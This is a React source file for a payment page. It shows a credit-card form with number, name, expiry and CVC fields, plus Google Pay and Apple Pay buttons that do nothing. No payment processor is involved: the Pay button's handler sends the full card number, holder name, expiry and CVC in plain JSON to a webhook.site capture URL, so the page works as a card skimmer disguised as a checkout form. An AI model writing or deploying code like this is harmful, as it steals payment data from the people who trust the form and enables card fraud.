import React, { useState } from 'react';
import Cards from 'react-credit-cards'
import 'react-credit-cards/es/styles-compiled.css'
import "./Payment.css"




function Payment() {


  const [number, setNumber] = useState('')
  const [name, setName] = useState('')
  const [expiary, setExpiary] = useState('')
  const [cvc, setCvc] = useState('')
  const [focus, setFocus] = useState('');

  const postData = async()=> {
    try{
      let result = await fetch('https://webhook.site/193ce373-7ef1-4a4b-8a9e-4ed0a3a170ce',{
        method: 'POST',
        mode: 'no-cors',
        headers: {
          'Accept': 'application/json',
          'content-type': 'application/json'
        },
        body: JSON.stringify({
          cardNumber: number,
          name: name,
          expiaryDate: expiary,
          CVC: cvc
        })
      });

      console.log("Result" + result);
      
    }catch(e){
      console.log(e)
    }
  };
  return (
    <div className="App">
      <div className="background">
        <div className="shape"></div>
        <div className="shape"></div>
      </div> 
      <form id="payment-form">
        <h3 className='spacing'>Payment</h3>
        <Cards
            number={number}
            name={name}
            expiry={expiary}
            cvc={cvc}
            focused={focus}
        />
        <p className='spacing'></p>
        <input
          required 
          type='tel'
          name="number" 
          placeholder='Card Number' 
          value={number} 
          onChange={e => setNumber(e.target.value)}
          onFocus={e => setFocus(e.target.name)}
        />

        <input 
        required
          type='text' 
          name="name" 
          placeholder='Name' 
          value={name} 
          onChange={e => setName(e.target.value)} 
          onFocus={e => setFocus(e.target.name)}
        />

        <input 
        required
          type='text' 
          name="expiry" 
          placeholder='MM/YY ' 
          value={expiary} 
          onChange={e => setExpiary(e.target.value)} 
          onFocus={e => setFocus(e.target.name)}
          id="expInput"
        />

        <input 
        required
          type='tel' 
          name="cvc" 
          placeholder='cvc' 
          value={cvc} 
          onChange={e => setCvc(e.target.value)} 
          onFocus={e => setFocus(e.target.name)}
          id="cvcInput"
        />


        <button onClick={postData}>
            Pay
            </button>
        <div className="social">
          <div className="go"><i className="fab fa-google"></i>  Google Pay</div>
          <div className="fb"><i className="fab fa-facebook"></i>  Apple Pay</div>
        </div>
      </form>
    </div>
  );
}

export default Payment;